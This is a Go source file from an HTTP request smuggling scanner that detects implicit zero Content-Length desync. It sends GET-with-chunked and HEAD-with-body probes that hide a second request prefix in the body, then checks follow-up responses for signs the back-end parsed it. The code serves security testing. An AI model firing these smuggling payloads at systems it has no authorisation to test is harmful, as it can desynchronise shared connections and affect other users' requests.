package scan

// implizero.go — Implicit Content-Length 0 / GET desync detection
//
// Maps to ImplicitZeroScan.java.
//
// Strategy:
// Some servers treat a GET/HEAD request as having an implicit CL=0.
// If a front-end proxy forwards the request and the back-end assigns an implicit
// body to it (e.g. treating the next pipelined request as the body), desync occurs.
// We also test for servers that accept a body on GET when chunked encoding is present.

import (
	"github.com/smuggled/smuggled/internal/request"
	"github.com/smuggled/smuggled/internal/config"
	"bytes"
	"fmt"
	"net/url"
	"strings"

	"github.com/smuggled/smuggled/internal/report"
	"github.com/smuggled/smuggled/internal/transport"
)

// implicitZeroInnerMethods are the smuggled inner request methods to try.
// Each produces a distinctive signal: GPOST/PFAKE/ADMIN trigger 400/405 on most
// servers; TRACE is reflected verbatim by some back-ends (detectable in r2 body);
// all are detected by the generic status/method-reflection check below.
var implicitZeroInnerMethods = []string{"GPOST", "TRACE", "PFAKE", "ADMIN"}

// ScanImplicitZero probes for implicit zero-CL GET desync.
//
// Two outer techniques (GET chunked, HEAD with body) × 4 inner methods = 8 total probes.
// Detection: follow-up response with status 400/405, or inner method reflected in body.
func ScanImplicitZero(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	rep.Log("ImplicitZero probe: %s", target.Host)
	dbg(cfg, "ImplicitZero: starting, target=%s", target.Host)

	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	// Follow-up request shared across all inner-method variants.
	followup := []byte("GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n")

	for _, smuggledMethod := range implicitZeroInnerMethods {
		// Technique 1: GET with Transfer-Encoding: chunked + smuggled body after 0-chunk.
		// RFC says GET has no body, but some parsers accept it.
		// Chunk body = "0\r\n\r\n<inner method> ..." — the 0-chunk terminates the chunked
		// body from the front-end's perspective; the trailer is the inner request prefix.
		smuggledPrefix := smuggledMethod + " " + path + " HTTP/1.1\r\nFoo: x"
		chunkBody := fmt.Sprintf("0\r\n\r\n%s", smuggledPrefix)

		var getChunked strings.Builder
		getChunked.WriteString("GET " + path + " HTTP/1.1\r\n")
		getChunked.WriteString("Host: " + host + "\r\n")
		getChunked.WriteString("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n")
		getChunked.WriteString("Transfer-Encoding: chunked\r\n")
		getChunked.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(chunkBody)))
		getChunked.WriteString("Connection: keep-alive\r\n")
		getChunked.WriteString("\r\n")
		getChunked.WriteString(chunkBody)

		probeBytes := []byte(getChunked.String())

		conn, err := transport.Dial(target, cfg.Timeout, cfg.Proxy, cfg.SkipTLSVerify)
		if err != nil {
			rep.Log("ImplicitZero: dial error: %v", err)
			return
		}

		if err := conn.Send(probeBytes); err != nil {
			conn.Close()
			continue
		}
		r1, _, t1 := conn.RecvWithTimeout(cfg.Timeout)
		dbg(cfg, "ImplicitZero GET[%s]: r1 status=%d len=%d timeout=%v", smuggledMethod, request.StatusCode(r1), len(r1), t1)

		if !t1 && len(r1) > 0 && !request.ContainsStr(r1, "connection: close") {
			if err := conn.Send(followup); err == nil {
				r2, _, t2 := conn.RecvWithTimeout(cfg.Timeout)
				dbg(cfg, "ImplicitZero GET[%s]: r2 status=%d len=%d timeout=%v", smuggledMethod, request.StatusCode(r2), len(r2), t2)
				if !t2 && len(r2) > 0 {
					st2 := request.StatusCode(r2)
					if st2 == 400 || st2 == 405 || bytes.Contains(r2, []byte(smuggledMethod)) {
						dbg(cfg, "ImplicitZero GET[%s]: DETECTED r2_status=%d", smuggledMethod, st2)
						conn.Close()
						rep.Emit(report.Finding{
							Target:    target.String(),
							Method:    config.EffectiveMethods(cfg)[0],
							Severity:  report.SeverityProbable,
							Type:      "implicit-zero-CL",
							Technique: "GET-chunked-smuggle/" + smuggledMethod,
							Description: fmt.Sprintf(
								"Follow-up got status %d — inner method %q reflected or rejected. "+
									"Implicit CL=0 GET desync: front-end ignores GET body, "+
									"back-end parses it as a new pipelined request.", st2, smuggledMethod),
							Evidence:  fmt.Sprintf("inner_method=%s r1_status=%d r2_status=%d", smuggledMethod, request.StatusCode(r1), st2),
							RawProbe:  request.Truncate(getChunked.String(), 512),
						})
						if cfg.ExitOnFind {
							return
						}
						continue
					}
				}
			}
		}
		conn.Close()
	}

	// Technique 2: HEAD with body — some proxies strip HEAD body, back-end receives it.
	scanHeadDesync(target, host, path, cfg, rep)
}

func scanHeadDesync(target *url.URL, host, path string, cfg config.Config, rep *report.Reporter) {
	dbg(cfg, "ImplicitZero HEAD: starting")
	smuggledPrefix := "GPOST " + path + " HTTP/1.1\r\nFoo: x"
	bodyLen := len(smuggledPrefix)

	var headReq strings.Builder
	headReq.WriteString("HEAD " + path + " HTTP/1.1\r\n")
	headReq.WriteString("Host: " + host + "\r\n")
	headReq.WriteString("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n")
	headReq.WriteString("Transfer-Encoding: chunked\r\n")
	headReq.WriteString(fmt.Sprintf("Content-Length: %d\r\n", bodyLen))
	headReq.WriteString("Connection: keep-alive\r\n")
	headReq.WriteString("\r\n")
	headReq.WriteString(smuggledPrefix)

	followup := []byte("GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n")

	conn, err := transport.Dial(target, cfg.Timeout, cfg.Proxy, cfg.SkipTLSVerify)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.Send([]byte(headReq.String())) //nolint:errcheck
	r1, _, t1 := conn.RecvWithTimeout(cfg.Timeout)
	dbg(cfg, "ImplicitZero HEAD: r1 status=%d len=%d timeout=%v", request.StatusCode(r1), len(r1), t1)
	if t1 || len(r1) == 0 {
		return
	}
	if request.ContainsStr(r1, "connection: close") {
		dbg(cfg, "ImplicitZero HEAD: connection closed after r1")
		return
	}

	conn.Send(followup) //nolint:errcheck
	r2, _, _ := conn.RecvWithTimeout(cfg.Timeout)
	dbg(cfg, "ImplicitZero HEAD: r2 status=%d len=%d", request.StatusCode(r2), len(r2))

	if len(r2) > 0 {
		st2 := request.StatusCode(r2)
		if st2 == 400 || st2 == 405 {
			dbg(cfg, "ImplicitZero HEAD: DETECTED — r2_status=%d", st2)
			rep.Emit(report.Finding{
				Target:      target.String(),
				Method:      config.EffectiveMethods(cfg)[0],
				Severity:    report.SeverityProbable,
				Type:        "implicit-zero-CL",
				Technique:   "HEAD-body-smuggle",
				Description: fmt.Sprintf("HEAD request with chunked body — follow-up got status %d, indicating smuggled prefix was parsed as a new request (implicit CL=0 HEAD desync)", st2),
				Evidence:    fmt.Sprintf("r1_status=%d r2_status=%d", request.StatusCode(r1), st2),
				RawProbe:    request.Truncate(headReq.String(), 512),
			})
		}
	}
}
